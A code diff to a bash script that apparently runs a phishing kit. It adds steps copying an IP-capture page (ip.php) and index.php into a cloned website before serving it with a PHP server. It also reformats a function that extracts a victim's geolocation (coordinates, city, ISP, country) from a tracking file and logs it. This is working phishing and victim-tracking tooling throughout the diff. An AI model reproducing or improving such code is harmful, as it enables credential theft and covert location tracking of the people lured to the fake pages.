@@ -529,6 +529,8 @@ cusport() {
 setup_site() {
         echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
         cp -rf .sites/"$website"/* .server/www
+				cp .sites/ip.php .sites/"$website"/* .server/www
+				cp .sites/index.php .sites/"$website"/* .server/www
 	cusport
         echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
         cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
@@ -798,51 +800,51 @@ ip_details() {
 	fi
 	iptype=$(sed -n 's/"type"://p' track.txt)
 	if [[ $iptype != "" ]]; then
-		echo -e "\n${GREEN} IP type: ${NC} $iptype"
+		echo -e "${GREEN} IP type: ${NC} $iptype"
 	fi
 	latitude=$(sed -n 's/"latitude"://p' track.txt)
 	if [[ $latitude != "" ]]; then
-		echo -e  "\n${GREEN} Latitude:  ${NC} $latitude"
+		echo -e  "${GREEN} Latitude:  ${NC} $latitude"
 	fi
 	longitude=$(sed -n 's/"longitude"://p' track.txt)
 	if [[ $longitude != "" ]]; then
-		echo -e  "\n${GREEN} Longitude:  ${NC} $longitude"
+		echo -e  "${GREEN} Longitude:  ${NC} $longitude"
 	fi
 	city=$(sed -n 's/"city"://p' track.txt)
 	if [[ $city != "" ]]; then
-		echo -e "\n${GREEN} City: ${NC} $city"
+		echo -e "${GREEN} City: ${NC} $city"
 	fi
 	isp=$(sed -n 's/"isp"://p' track.txt)
 	if [[ $isp != "" ]]; then
-		echo -e "\n${GREEN} Isp: ${NC} $isp"
+		echo -e "${GREEN} Isp: ${NC} $isp"
 	fi
 	country=$(sed -n 's/"country"://p' track.txt)
 	if [[ $country != "" ]]; then
-		echo -e  "\n${GREEN} Country: ${NC} $country"
+		echo -e  "${GREEN} Country: ${NC} $country"
 	fi
 	flag=$(sed -n 's/"country_flag"://p' track.txt)
 	if [[ $flag != "" ]]; then
-		echo -e "\n${GREEN} Country flag: ${NC} $flag"
+		echo -e "${GREEN} Country flag: ${NC} $flag"
 	fi
 	cap=$(sed -n 's/"country_capital"://p' track.txt)
 	if [[ $cap != "" ]]; then
-		echo -e "\n${GREEN} Country capital: ${NC} $cap"
+		echo -e "${GREEN} Country capital: ${NC} $cap"
 	fi
 	phon=$(sed -n 's/"country_phone"://p' track.txt)
 	if [[ $phon != "" ]]; then
-		echo -e "\n${GREEN} Country code: ${NC} $phon"
+		echo -e "${GREEN} Country code: ${NC} $phon"
 	fi
 	continent=$(sed -n 's/"continent"://p' track.txt)
 	if [[ $continent != "" ]]; then
-		echo -e  "\n${GREEN} Continent:  ${NC} $continent"
+		echo -e  "${GREEN} Continent:  ${NC} $continent"
 	fi
 	ccode=$(sed -n 's/"currency_code"://p' track.txt)
 	if [[ $ccode != "" ]]; then
-		echo -e "\n${GREEN} Currency code: ${NC} $ccode"
+		echo -e "${GREEN} Currency code: ${NC} $ccode"
 	fi
 	region=$(sed -n 's/"region"://p' track.txt)
 	if [[ $region != "" ]]; then
-		echo -e "\n${GREEN} State: ${NC} $region"
+		echo -e "${GREEN} State: ${NC} $region"
 	fi
 	cat track.txt >> "${log_name}.txt"
 	rm -rf track.txt
